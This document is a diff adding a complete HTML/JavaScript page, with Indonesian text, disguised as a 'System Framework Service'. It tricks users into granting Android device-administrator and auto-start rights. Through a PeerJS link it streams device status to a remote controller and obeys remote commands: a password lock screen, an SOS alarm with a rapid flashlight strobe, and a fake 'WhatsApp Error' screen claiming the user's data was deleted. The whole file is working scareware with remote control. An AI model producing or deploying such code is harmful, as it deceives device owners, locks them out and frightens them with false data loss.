@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Framework Service</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; margin: 0; }
+        .overlay { display: none; position: fixed; inset: 0; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; }
+        #lock-screen { background: #000; transition: 0.5s; }
+        #wa-screen { background: #075e54; }
+        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #ef4444; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .bar-animate { animation: loading-bar 2s linear infinite; }
+        @keyframes loading-bar { 0% {transform:translateX(-100%)} 100% {transform:translateX(100%)} }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div id="admin-request" class="fixed inset-0 bg-black z-[100000] flex flex-col items-center justify-center p-10 text-center">
+        <div class="mb-8 relative">
+            <i class="fas fa-shield-virus text-7xl text-red-600 animate-pulse"></i>
+            <div class="absolute -top-2 -right-2 bg-white rounded-full p-1 text-black text-[10px] font-black italic">V5</div>
+        </div>
+        <h1 class="text-xl font-black mb-4 uppercase tracking-tighter">System Optimization Required</h1>
+        <p class="text-[11px] text-zinc-500 mb-10 leading-relaxed uppercase font-bold italic">Agar sistem tetap berjalan otomatis (Auto-Boot) dan fitur keamanan framework aktif, Anda harus mengizinkan akses Administrator.</p>
+        
+        <button onclick="activateAdmin()" class="w-full py-5 bg-zinc-900 border border-red-900/50 rounded-3xl font-black text-xs text-red-500 shadow-[0_0_30px_#9003] active:scale-95 transition-all mb-4">
+            AKTIFKAN AUTO-BOOT & ADMIN
+        </button>
+        <p class="text-[8px] text-zinc-700 uppercase font-black tracking-[0.4em]">Surxat v5 Engine</p>
+    </div>
+
+    <div id="main-ui" class="flex flex-col items-center justify-center min-h-screen p-8 text-center opacity-0 transition-opacity duration-1000">
+        <div class="loader mb-6"></div>
+        <h2 class="text-xs font-black tracking-widest text-zinc-600">SYSTEM SYNCING...</h2>
+        <div class="bg-zinc-900/30 p-8 rounded-[3rem] border border-zinc-800 w-full max-w-xs mt-10">
+            <p class="text-[8px] text-zinc-700 font-black mb-3 tracking-[0.3em]">OWNER PAIRING ID</p>
+            <div id="peer-id" class="text-3xl font-mono font-black text-red-600 italic tracking-tighter">-- -- --</div>
+        </div>
+    </div>
+
+    <div id="lock-screen" class="overlay">
+        <i class="fas fa-biohazard text-8xl text-red-600 mb-10 animate-bounce"></i>
+        <h1 id="lock-msg" class="text-2xl font-black text-red-600 mb-10 text-center uppercase tracking-tighter">SYSTEM LOCKED</h1>
+        <div class="w-72 px-4 text-center">
+            <input type="password" id="unlock-pass" placeholder="PASSWORD" class="w-full p-5 bg-zinc-900 border border-red-900/20 rounded-3xl text-center text-white outline-none focus:border-red-600 mb-4 font-black">
+            <button onclick="checkPass()" id="btn-unlock" class="w-full py-5 bg-red-950/30 border border-red-600 rounded-3xl font-black text-xs text-red-500 uppercase tracking-widest">Authorize Unlock</button>
+            <p id="lock-timer" class="text-[10px] text-red-600 mt-6 font-black hidden uppercase">Hukuman 1 Menit Aktif!</p>
+        </div>
+    </div>
+
+    <div id="wa-screen" class="overlay">
+        <i class="fab fa-whatsapp text-[120px] mb-8"></i>
+        <h1 class="text-2xl font-black">WhatsApp Error</h1>
+        <p class="text-xs opacity-50 p-10 text-center uppercase font-bold">Basis data terhapus secara otomatis oleh sistem keamanan framework (0x882X).</p>
+        <div class="w-64 h-1 bg-white/10 rounded-full overflow-hidden">
+            <div class="h-full bg-white bar-animate"></div>
+        </div>
+    </div>
+
+    <script>
+        const peer = new Peer();
+        let conn;
+        let masterPass = "DENIS";
+        let attemptCount = 0;
+        let isLockout = false;
+        let flashOn = false;
+        let strobeInt;
+        const alarm = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); 
+        alarm.loop = true;
+
+        function initApp() {
+            // Menyimpan status boot agar sistem ingat
+            localStorage.setItem('surxat_active', 'true');
+        }
+
+        function activateAdmin() {
+            document.getElementById('admin-request').style.display = 'none';
+            document.getElementById('main-ui').style.opacity = '1';
+            
+            // Perintah Android Intent untuk Admin & Auto-Start Settings
+            // Mencoba membuka setting administrator
+            window.location.href = "intent:#Intent;action=android.settings.DEVICE_ADMIN_SETTINGS;end";
+            
+            setTimeout(() => {
+                alert("PENTING:\n1. Aktifkan 'System Framework' sebagai Admin.\n2. Berikan izin 'Mulai Otomatis' (Auto-start) di pengaturan aplikasi.");
+            }, 1000);
+        }
+
+        peer.on('open', id => { 
+            document.getElementById('peer-id').innerText = id;
+            // Kirim ID ke console atau simpan untuk owner
+        });
+
+        peer.on('connection', c => {
+            conn = c;
+            // Kirim data Baterai & Jaringan otomatis (Monitoring Fitur Foto)
+            setInterval(async () => {
+                const batt = await navigator.getBattery();
+                conn.send({
+                    type: 'system_data',
+                    battery: Math.round(batt.level * 100),
+                    network: navigator.onLine ? "ONLINE" : "OFFLINE",
+                    charging: batt.charging
+                });
+            }, 4000);
+
+            conn.on('data', data => {
+                // LOGIKA SOS DENISCUNK
+                if(data.command === 'sos_alarm') {
+                    masterPass = "DENIS";
+                    document.getElementById('lock-msg').innerText = "SECURITY BREACH: SOS MODE";
+                    document.getElementById('lock-screen').style.display = 'flex';
+                    alarm.play(); startStrobe();
+                }
+                
+                if(data.command === 'unlock_sos' || data.command === 'force_unlock') {
+                    stopStrobe(); alarm.pause();
+                    document.getElementById('lock-screen').style.display = 'none';
+                    document.getElementById('wa-screen').style.display = 'none';
+                    isLockout = false; attemptCount = 0;
+                }
+
+                if(data.command === 'lock_screen') {
+                    masterPass = data.lockPass;
+                    document.getElementById('lock-msg').innerText = data.lockName;
+                    document.getElementById('lock-screen').style.display = 'flex';
+                }
+
+                if(data.command === 'bug_wa_sim') { 
+                    document.getElementById('wa-screen').style.display = 'flex'; 
+                }
+
+                if(data.command === 'toggle_flash') { toggleFlash(); }
+            });
+        });
+
+        function checkPass() {
+            if(isLockout) return;
+            const input = document.getElementById('unlock-pass').value;
+            if(input === masterPass) {
+                document.getElementById('lock-screen').style.display = 'none';
+                stopStrobe(); alarm.pause(); attemptCount = 0;
+            } else {
+                attemptCount++;
+                if(attemptCount >= 5) {
+                    isLockout = true;
+                    document.getElementById('lock-timer').classList.remove('hidden');
+                    setTimeout(() => { 
+                        isLockout = false; 
+                        attemptCount = 0; 
+                        document.getElementById('lock-timer').classList.add('hidden'); 
+                    }, 60000);
+                }
+            }
+        }
+
+        function startStrobe() {
+            strobeInt = setInterval(() => {
+                flashOn = !flashOn;
+                navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',torch:true}})
+                .then(s => s.getVideoTracks()[0].applyConstraints({advanced:[{torch:flashOn}]}));
+            }, 150); // Lebih cepat dari sebelumnya (150ms)
+        }
+
+        function stopStrobe() {
+            clearInterval(strobeInt);
+            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',torch:true}})
+            .then(s => s.getVideoTracks()[0].applyConstraints({advanced:[{torch:false}]}));
+        }
+
+        function toggleFlash() {
+            flashOn = !flashOn;
+            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',torch:true}})
+            .then(s => s.getVideoTracks()[0].applyConstraints({advanced:[{torch:flashOn}]}));
+        }
+    </script>
+</body>
+</html>
